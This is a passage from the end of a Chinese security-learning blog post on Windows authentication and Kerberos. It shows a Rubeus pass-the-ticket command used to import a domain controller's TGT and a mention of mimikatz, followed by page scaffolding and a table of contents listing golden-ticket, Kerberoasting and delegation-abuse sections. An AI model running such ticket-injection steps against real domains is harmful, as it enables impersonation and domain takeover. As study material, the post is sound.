+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-165432.png"
+                      alt="image-20230426005431373"
+                ></p>
+<p>使用Rubues导入base64的ticket</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe ptt /ticket:base64</span><br></pre></td></tr></table></figure>
+
+<p>此时导出的ticket就有DC的TGT了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-165617.png"
+                      alt="image-20230426005617211"
+                ></p>
+<p>用mimikatz ptt就完事</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-25-165645.png"
+                      alt="image-20230426005645119"
+                ></p>
+<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h4>
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：关于Windows协议学习</li>
+        <li>本文作者：mes9s0</li>
+        <li>创建时间：2023-03-10 16:02:21</li>
+        <li>
+            本文链接：https://mes9s0.github.io/2023/03/10/关于Windows协议学习/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Windows/">#Windows</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81/">#本地认证</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81/">#网络认证</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Kerberos/">#Kerberos</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Windows-Access-Token/">#Windows Access Token</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/02/18/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-8-Commons-Collections-POP-Gadget-Chains%E7%AE%80%E4%BB%8B/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java安全从零到一(8)-Commons Collections POP Gadget Chains简介</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'VOW0hvnes0uKAXRkVyEuVvR4-9Nh9j0Va',
+                    appKey: '46zItzkbXxcS29wD64JlGikD',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜 尽情吐槽吧~',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'mes9s0';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">mes9s0</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="nav-number">2.</span> <span class="nav-text">本地认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">本地认证基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-NT-LAN-Manager-Hash"><span class="nav-number">2.2.</span> <span class="nav-text">NTLM(NT LAN Manager) Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash%E4%B8%8ENTLM"><span class="nav-number">2.3.</span> <span class="nav-text">NTLM Hash与NTLM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="nav-number">2.4.</span> <span class="nav-text">NTLM Hash的产生</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">2.5.</span> <span class="nav-text">本地认证流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LM-Hash"><span class="nav-number">2.6.</span> <span class="nav-text">LM Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81"><span class="nav-number">3.</span> <span class="nav-text">网络认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.1.</span> <span class="nav-text">NTLM 协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-%E6%8C%91%E6%88%98-Response-%E5%93%8D%E5%BA%94"><span class="nav-number">3.2.</span> <span class="nav-text">Challenge(挑战)&#x2F;Response(响应)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-V2%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.3.</span> <span class="nav-text">NTLM V2协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM%E5%8D%8F%E8%AE%AE%E5%BB%B6%E4%BC%B8"><span class="nav-number">3.4.</span> <span class="nav-text">NTLM协议延伸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Hash"><span class="nav-number">3.5.</span> <span class="nav-text">Pass The Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81"><span class="nav-number">4.</span> <span class="nav-text">Kerberos域认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Active-Directory-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-%E6%A6%82%E5%BF%B5"><span class="nav-number">4.1.</span> <span class="nav-text">Active Directory(活动目录)概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Active-Directory-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-%E5%8A%9F%E8%83%BD"><span class="nav-number">4.2.</span> <span class="nav-text">Active Directory(活动目录)功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB-Kerbroes"><span class="nav-number">4.3.</span> <span class="nav-text">域认证体系 - Kerbroes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%89%80%E5%8F%82%E4%B8%8E%E7%9A%84%E8%A7%92%E8%89%B2"><span class="nav-number">4.4.</span> <span class="nav-text">域认证所参与的角色</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%89%80%E5%8F%82%E4%B8%8E%E7%9A%84%E8%A7%92%E8%89%B2%EF%BC%88KDC%EF%BC%89"><span class="nav-number">4.5.</span> <span class="nav-text">域认证所参与的角色（KDC）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%B2%97%E7%95%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">4.6.</span> <span class="nav-text">域认证粗略流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B"><span class="nav-number">4.7.</span> <span class="nav-text">域认证详细流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets"><span class="nav-number">4.8.</span> <span class="nav-text">白银票据(Silver Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets"><span class="nav-number">4.9.</span> <span class="nav-text">伪造白银票据(Silver Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Tickets-%E9%98%B2%E5%BE%A1"><span class="nav-number">4.10.</span> <span class="nav-text">白银票据(Silver Tickets)防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets"><span class="nav-number">4.11.</span> <span class="nav-text">黄金票据(Golden Tickets)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets-MSF-kiwi"><span class="nav-number">4.12.</span> <span class="nav-text">黄金票据(Golden Tickets)-MSF kiwi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets-%E4%BC%AA%E9%80%A0"><span class="nav-number">4.13.</span> <span class="nav-text">黄金票据(Golden Tickets) - 伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tickets-%E6%80%BB%E7%BB%93"><span class="nav-number">4.14.</span> <span class="nav-text">Tickets 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Access-Token"><span class="nav-number">5.</span> <span class="nav-text">Windows Access Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token-%E7%AE%80%E4%BB%8B"><span class="nav-number">5.1.</span> <span class="nav-text">Windows Access Token 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E7%BB%84%E6%88%90"><span class="nav-number">5.2.</span> <span class="nav-text">Windows Access Token组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token-%E2%80%93-SID-Security-Identifiers-%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6"><span class="nav-number">5.3.</span> <span class="nav-text">Windows Access Token – SID (Security Identifiers)安全标识符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B"><span class="nav-number">5.4.</span> <span class="nav-text">Windows Access Token产生过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92%E5%AE%9E%E6%88%98"><span class="nav-number">5.5.</span> <span class="nav-text">Windows Access Token令牌假冒实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Access-Token%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92%E9%98%B2%E5%BE%A1"><span class="nav-number">5.6.</span> <span class="nav-text">Windows Access Token令牌假冒防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#From-%E5%80%BE%E6%97%8B"><span class="nav-number">6.</span> <span class="nav-text">From 倾旋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E7%AF%87%E8%A1%A5%E5%85%85"><span class="nav-number">7.</span> <span class="nav-text">Kerberos篇补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos%E6%B5%81%E7%A8%8B%E5%86%8D%E5%A4%8D%E4%B9%A0"><span class="nav-number">7.1.</span> <span class="nav-text">Kerberos流程再复习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REQ-amp-AS-REP%E5%BC%95%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.2.</span> <span class="nav-text">AS_REQ &amp; AS_REP引出的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Pass-the-hash"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. Pass the hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 用户名枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Password-Spraying"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. Password Spraying</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-AS-REP-Roasting"><span class="nav-number">7.2.4.</span> <span class="nav-text">4. AS-REP Roasting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.2.5.</span> <span class="nav-text">5. 黄金票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">7.2.6.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#getTGT"><span class="nav-number">7.2.6.1.</span> <span class="nav-text">getTGT</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GetNPUsers"><span class="nav-number">7.2.6.2.</span> <span class="nav-text">GetNPUsers</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ticketer"><span class="nav-number">7.2.6.3.</span> <span class="nav-text">ticketer</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Rubeus"><span class="nav-number">7.2.6.4.</span> <span class="nav-text">Rubeus</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mimikatz"><span class="nav-number">7.2.6.5.</span> <span class="nav-text">Mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#kerberos-golden"><span class="nav-number">7.2.6.5.1.</span> <span class="nav-text">kerberos::golden</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DomainPasswordSpray"><span class="nav-number">7.2.6.6.</span> <span class="nav-text">DomainPasswordSpray</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP"><span class="nav-number">7.3.</span> <span class="nav-text">TGS_REQ &amp; TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TGS-REQ"><span class="nav-number">7.3.1.</span> <span class="nav-text">TGS_REQ</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-msg-type"><span class="nav-number">7.3.1.1.</span> <span class="nav-text">1. msg-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-PA-DATA"><span class="nav-number">7.3.1.2.</span> <span class="nav-text">2. PA-DATA</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-REQ-BODY"><span class="nav-number">7.3.1.3.</span> <span class="nav-text">3. REQ_BODY</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TGS-REP"><span class="nav-number">7.3.2.</span> <span class="nav-text">TGS_REP</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-msg-type-1"><span class="nav-number">7.3.2.1.</span> <span class="nav-text">1. msg-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-ticket"><span class="nav-number">7.3.2.2.</span> <span class="nav-text">2. ticket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-Enc-part"><span class="nav-number">7.3.2.3.</span> <span class="nav-text">3. Enc_part</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2SELF"><span class="nav-number">7.4.</span> <span class="nav-text">S4U2SELF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S4U2PROXY"><span class="nav-number">7.5.</span> <span class="nav-text">S4U2PROXY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E4%BB%8B%E7%BB%8D"><span class="nav-number">7.6.</span> <span class="nav-text">PAC介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PAC%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98MS14-068"><span class="nav-number">7.7.</span> <span class="nav-text">PAC安全问题MS14-068</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="nav-number">7.7.1.</span> <span class="nav-text">工具：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#kekeo"><span class="nav-number">7.7.1.1.</span> <span class="nav-text">kekeo</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#impacket"><span class="nav-number">7.7.1.2.</span> <span class="nav-text">impacket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-pykek"><span class="nav-number">7.7.1.3.</span> <span class="nav-text">3. pykek</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TGS-REQ-amp-TGS-REP%E5%BC%95%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">7.8.</span> <span class="nav-text">TGS_REQ &amp; TGS_REP引出的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.8.1.</span> <span class="nav-text">白银票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kerberoasting"><span class="nav-number">7.8.2.</span> <span class="nav-text">Kerberoasting</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E7%AE%80%E4%BB%8B"><span class="nav-number">7.8.2.1.</span> <span class="nav-text">SPN简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E6%A0%BC%E5%BC%8F"><span class="nav-number">7.8.2.2.</span> <span class="nav-text">SPN格式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SPN%E6%9F%A5%E8%AF%A2"><span class="nav-number">7.8.2.3.</span> <span class="nav-text">SPN查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kerberoasting"><span class="nav-number">7.8.2.4.</span> <span class="nav-text">kerberoasting</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.</span> <span class="nav-text">委派</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.1.</span> <span class="nav-text">域委派</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.2.</span> <span class="nav-text">非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.2.1.</span> <span class="nav-text">设置非约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%AE%BE%E7%BD%AE"><span class="nav-number">7.9.2.1.1.</span> <span class="nav-text">机器账户的非约束性委派设置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E7%9A%84%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E8%AE%BE%E7%BD%AE"><span class="nav-number">7.9.2.1.2.</span> <span class="nav-text">服务账户的非约束委派设置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E8%AE%BE%E7%BD%AE%E4%BA%86%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7"><span class="nav-number">7.9.2.1.3.</span> <span class="nav-text">查询域内设置了非约束委派的服务账户</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E8%AE%BE%E7%BD%AE%E4%BA%86%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">7.9.2.1.4.</span> <span class="nav-text">查询域内设置了非约束委派的机器账户</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F1"><span class="nav-number">7.9.3.</span> <span class="nav-text">非约束委派利用方式1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2%EF%BC%88Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="nav-number">7.9.4.</span> <span class="nav-text">非约束委派利用方式2（Spooler打印机服务）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.5.</span> <span class="nav-text">约束性委派</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
